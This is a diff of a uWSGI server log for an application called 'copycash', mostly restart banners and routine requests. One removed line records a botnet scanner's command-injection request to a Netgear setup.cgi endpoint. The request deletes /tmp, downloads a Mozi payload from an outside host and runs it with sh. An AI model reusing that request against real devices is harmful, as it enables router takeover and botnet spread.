-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5608a3adcf80 pid: 4139 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55c819c58f80 pid: 8264 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 4139)
-spawned uWSGI worker 1 (pid: 4144, cores: 1)
-spawned uWSGI worker 2 (pid: 4145, cores: 1)
-spawned uWSGI worker 3 (pid: 4146, cores: 1)
-spawned uWSGI worker 4 (pid: 4147, cores: 1)
-spawned uWSGI worker 5 (pid: 4148, cores: 1)
-[pid: 4148|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 779 bytes} [Thu Feb 18 23:28:37 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 4148|app: 0|req: 2/2] 177.37.194.64 () {42 vars in 783 bytes} [Thu Feb 18 23:30:30 2021] GET / => generated 34 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 4148|app: 0|req: 3/3] 177.37.194.64 () {42 vars in 783 bytes} [Thu Feb 18 23:33:59 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
+spawned uWSGI master process (pid: 8264)
+spawned uWSGI worker 1 (pid: 8267, cores: 1)
+spawned uWSGI worker 2 (pid: 8268, cores: 1)
+spawned uWSGI worker 3 (pid: 8269, cores: 1)
+spawned uWSGI worker 4 (pid: 8270, cores: 1)
+spawned uWSGI worker 5 (pid: 8271, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -642,7 +115,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 01:39:20 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:26:45 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -660,26 +133,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x5606aec8cf80
+Python main interpreter initialized at 0x5616e7b5ef80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 14 seconds on interpreter 0x5606aec8cf80 pid: 534 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5616e7b5ef80 pid: 8378 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 534)
-spawned uWSGI worker 1 (pid: 860, cores: 1)
-spawned uWSGI worker 2 (pid: 861, cores: 1)
-spawned uWSGI worker 3 (pid: 862, cores: 1)
-spawned uWSGI worker 4 (pid: 863, cores: 1)
-spawned uWSGI worker 5 (pid: 864, cores: 1)
-[pid: 861|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 779 bytes} [Fri Feb 19 01:39:48 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 863|app: 0|req: 1/2] 177.37.194.64 () {42 vars in 779 bytes} [Fri Feb 19 01:41:13 2021] GET / => generated 34 bytes in 5 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 864|app: 0|req: 1/3] 127.0.0.1 () {32 vars in 343 bytes} [Fri Feb 19 01:41:40 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 864|app: 0|req: 2/4] 177.37.194.64 () {42 vars in 779 bytes} [Fri Feb 19 01:45:28 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 864|app: 0|req: 3/5] 177.37.194.64 () {40 vars in 748 bytes} [Fri Feb 19 02:07:25 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 864|app: 0|req: 4/6] 177.37.194.64 () {40 vars in 701 bytes} [Fri Feb 19 02:07:26 2021] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 144 bytes (1 switches on core 0)
-[pid: 864|app: 0|req: 5/7] 177.37.194.64 () {40 vars in 748 bytes} [Fri Feb 19 02:20:38 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
+spawned uWSGI master process (pid: 8378)
+spawned uWSGI worker 1 (pid: 8381, cores: 1)
+spawned uWSGI worker 2 (pid: 8382, cores: 1)
+spawned uWSGI worker 3 (pid: 8383, cores: 1)
+spawned uWSGI worker 4 (pid: 8384, cores: 1)
+spawned uWSGI worker 5 (pid: 8385, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -688,7 +154,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 02:55:18 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:30:27 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -706,19 +172,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x56018ee88f80
+Python main interpreter initialized at 0x55e142ed3f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56018ee88f80 pid: 1436 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55e142ed3f80 pid: 8430 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1436)
-spawned uWSGI worker 1 (pid: 1439, cores: 1)
-spawned uWSGI worker 2 (pid: 1440, cores: 1)
-spawned uWSGI worker 3 (pid: 1441, cores: 1)
-spawned uWSGI worker 4 (pid: 1442, cores: 1)
-spawned uWSGI worker 5 (pid: 1443, cores: 1)
+spawned uWSGI master process (pid: 8430)
+spawned uWSGI worker 1 (pid: 8433, cores: 1)
+spawned uWSGI worker 2 (pid: 8434, cores: 1)
+spawned uWSGI worker 3 (pid: 8435, cores: 1)
+spawned uWSGI worker 4 (pid: 8436, cores: 1)
+spawned uWSGI worker 5 (pid: 8437, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -727,7 +193,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 02:55:24 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:32:32 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -745,29 +211,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x55a5b1311f80
+Python main interpreter initialized at 0x562a0ca9ff80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55a5b1311f80 pid: 1447 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x562a0ca9ff80 pid: 8496 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1447)
-spawned uWSGI worker 1 (pid: 1450, cores: 1)
-spawned uWSGI worker 2 (pid: 1451, cores: 1)
-spawned uWSGI worker 3 (pid: 1452, cores: 1)
-spawned uWSGI worker 4 (pid: 1453, cores: 1)
-spawned uWSGI worker 5 (pid: 1454, cores: 1)
-[pid: 1454|app: 0|req: 1/1] 127.0.0.1 () {32 vars in 348 bytes} [Fri Feb 19 02:55:30 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1454|app: 0|req: 2/2] 177.37.194.64 () {42 vars in 784 bytes} [Fri Feb 19 02:55:45 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (2 switches on core 0)
-[pid: 1452|app: 0|req: 1/3] 177.37.194.64 () {42 vars in 783 bytes} [Fri Feb 19 03:01:41 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1454|app: 0|req: 3/4] 177.37.194.64 () {42 vars in 783 bytes} [Fri Feb 19 03:01:49 2021] GET / => generated 34 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1454|app: 0|req: 4/5] 177.37.194.64 () {42 vars in 777 bytes} [Fri Feb 19 03:12:13 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1453|app: 0|req: 1/6] 119.167.21.129 () {26 vars in 602 bytes} [Fri Feb 19 03:29:28 2021] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.167.21.129:59224/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 232 bytes in 5 msecs (HTTP/1.0 404) 3 headers in 144 bytes (1 switches on core 0)
-[pid: 1454|app: 0|req: 5/7] 209.17.96.154 () {30 vars in 413 bytes} [Fri Feb 19 03:33:09 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1454|app: 0|req: 6/8] 177.37.194.64 () {42 vars in 783 bytes} [Fri Feb 19 03:36:01 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1453|app: 0|req: 2/9] 177.37.194.64 () {44 vars in 758 bytes} [Fri Feb 19 03:36:01 2021] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 144 bytes (1 switches on core 0)
-[pid: 1453|app: 0|req: 3/10] 177.37.194.64 () {42 vars in 783 bytes} [Fri Feb 19 03:36:03 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
+spawned uWSGI master process (pid: 8496)
+spawned uWSGI worker 1 (pid: 8499, cores: 1)
+spawned uWSGI worker 2 (pid: 8500, cores: 1)
+spawned uWSGI worker 3 (pid: 8501, cores: 1)
+spawned uWSGI worker 4 (pid: 8502, cores: 1)
+spawned uWSGI worker 5 (pid: 8503, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -775,8 +231,8 @@ worker 3 buried after 1 seconds
 worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 03:37:36 2021] ***
+unlink(): No such file or directory [core/uwsgi.c line 1662]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:34:12 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -794,22 +250,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x55dc2824ff80
+Python main interpreter initialized at 0x556783ac7f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 9 seconds on interpreter 0x55dc2824ff80 pid: 495 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x556783ac7f80 pid: 8514 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 495)
-spawned uWSGI worker 1 (pid: 754, cores: 1)
-spawned uWSGI worker 2 (pid: 755, cores: 1)
-spawned uWSGI worker 3 (pid: 756, cores: 1)
-spawned uWSGI worker 4 (pid: 757, cores: 1)
-spawned uWSGI worker 5 (pid: 758, cores: 1)
-[pid: 754|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 788 bytes} [Fri Feb 19 03:37:49 2021] GET / => generated 34 bytes in 5 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 758|app: 0|req: 1/2] 177.37.194.64 () {42 vars in 784 bytes} [Fri Feb 19 03:39:45 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 754|app: 0|req: 2/3] 177.37.194.64 () {42 vars in 788 bytes} [Fri Feb 19 03:39:45 2021] GET / => generated 34 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
+spawned uWSGI master process (pid: 8514)
+spawned uWSGI worker 1 (pid: 8519, cores: 1)
+spawned uWSGI worker 2 (pid: 8520, cores: 1)
+spawned uWSGI worker 3 (pid: 8521, cores: 1)
+spawned uWSGI worker 4 (pid: 8522, cores: 1)
+spawned uWSGI worker 5 (pid: 8523, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -818,7 +271,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 03:42:58 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:35:48 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -836,19 +289,22 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x55bb44fe2f80
+Python main interpreter initialized at 0x5566afd95f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55bb44fe2f80 pid: 879 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5566afd95f80 pid: 8546 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 879)
-spawned uWSGI worker 1 (pid: 883, cores: 1)
-spawned uWSGI worker 2 (pid: 884, cores: 1)
-spawned uWSGI worker 3 (pid: 885, cores: 1)
-spawned uWSGI worker 4 (pid: 886, cores: 1)
-spawned uWSGI worker 5 (pid: 887, cores: 1)
+spawned uWSGI master process (pid: 8546)
+spawned uWSGI worker 1 (pid: 8549, cores: 1)
+spawned uWSGI worker 2 (pid: 8550, cores: 1)
+spawned uWSGI worker 3 (pid: 8551, cores: 1)
+spawned uWSGI worker 4 (pid: 8552, cores: 1)
+spawned uWSGI worker 5 (pid: 8553, cores: 1)
+[pid: 8553|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 680 bytes} [Sat Feb 20 06:35:52 2021] GET / => generated 19 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 8553|app: 0|req: 2/2] 177.37.194.64 () {42 vars in 680 bytes} [Sat Feb 20 06:36:36 2021] GET / => generated 19 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 8553|app: 0|req: 3/3] 177.37.194.64 () {42 vars in 680 bytes} [Sat Feb 20 06:36:40 2021] GET / => generated 19 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 131 bytes (1 switches on core 0)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -857,7 +313,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 03:47:49 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:36:44 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -875,20 +331,21 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x56197ee32f80
+Python main interpreter initialized at 0x56287f708f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56197ee32f80 pid: 933 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56287f708f80 pid: 8811 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 933)
-spawned uWSGI worker 1 (pid: 936, cores: 1)
-spawned uWSGI worker 2 (pid: 937, cores: 1)
-spawned uWSGI worker 3 (pid: 938, cores: 1)
-spawned uWSGI worker 4 (pid: 939, cores: 1)
-spawned uWSGI worker 5 (pid: 940, cores: 1)
-[pid: 940|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 783 bytes} [Fri Feb 19 03:48:45 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
+spawned uWSGI master process (pid: 8811)
+spawned uWSGI worker 1 (pid: 8814, cores: 1)
+spawned uWSGI worker 2 (pid: 8815, cores: 1)
+spawned uWSGI worker 3 (pid: 8816, cores: 1)
+spawned uWSGI worker 4 (pid: 8817, cores: 1)
+spawned uWSGI worker 5 (pid: 8818, cores: 1)
+[pid: 8815|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 680 bytes} [Sat Feb 20 06:36:48 2021] GET / => generated 22 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 8815|app: 0|req: 2/2] 177.37.194.64 () {42 vars in 680 bytes} [Sat Feb 20 06:37:18 2021] GET / => generated 22 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 131 bytes (1 switches on core 0)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -897,7 +354,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 03:49:42 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:47:05 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -915,298 +372,25 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x5645c362bf80
+Python main interpreter initialized at 0x5604258d4f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5645c362bf80 pid: 977 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5604258d4f80 pid: 9947 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 977)
-spawned uWSGI worker 1 (pid: 982, cores: 1)
-spawned uWSGI worker 2 (pid: 983, cores: 1)
-spawned uWSGI worker 3 (pid: 984, cores: 1)
-spawned uWSGI worker 4 (pid: 985, cores: 1)
-spawned uWSGI worker 5 (pid: 986, cores: 1)
-[pid: 985|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 779 bytes} [Fri Feb 19 03:49:47 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (2 switches on core 0)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:01:35 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x557f16112f80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x557f16112f80 pid: 1084 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1084)
-spawned uWSGI worker 1 (pid: 1087, cores: 1)
-spawned uWSGI worker 2 (pid: 1088, cores: 1)
-spawned uWSGI worker 3 (pid: 1089, cores: 1)
-spawned uWSGI worker 4 (pid: 1090, cores: 1)
-spawned uWSGI worker 5 (pid: 1091, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:01:47 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x55562c785f80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55562c785f80 pid: 1121 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1121)
-spawned uWSGI worker 1 (pid: 1124, cores: 1)
-spawned uWSGI worker 2 (pid: 1125, cores: 1)
-spawned uWSGI worker 3 (pid: 1126, cores: 1)
-spawned uWSGI worker 4 (pid: 1127, cores: 1)
-spawned uWSGI worker 5 (pid: 1128, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:02:43 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x56080f249f80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56080f249f80 pid: 1135 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1135)
-spawned uWSGI worker 1 (pid: 1138, cores: 1)
-spawned uWSGI worker 2 (pid: 1139, cores: 1)
-spawned uWSGI worker 3 (pid: 1140, cores: 1)
-spawned uWSGI worker 4 (pid: 1141, cores: 1)
-spawned uWSGI worker 5 (pid: 1142, cores: 1)
-[pid: 1142|app: 0|req: 1/1] 177.37.194.64 () {56 vars in 1019 bytes} [Fri Feb 19 04:05:03 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1142|app: 0|req: 2/2] 177.37.194.64 () {56 vars in 973 bytes} [Fri Feb 19 04:05:04 2021] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 144 bytes (2 switches on core 0)
-[pid: 1142|app: 0|req: 3/3] 95.86.25.243 () {36 vars in 533 bytes} [Fri Feb 19 04:05:49 2021] GET / => generated 34 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1141|app: 0|req: 1/4] 177.37.194.64 () {40 vars in 748 bytes} [Fri Feb 19 04:06:38 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 1142|app: 0|req: 4/5] 177.37.194.64 () {40 vars in 701 bytes} [Fri Feb 19 04:06:39 2021] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.1 404) 3 headers in 144 bytes (1 switches on core 0)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:07:05 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
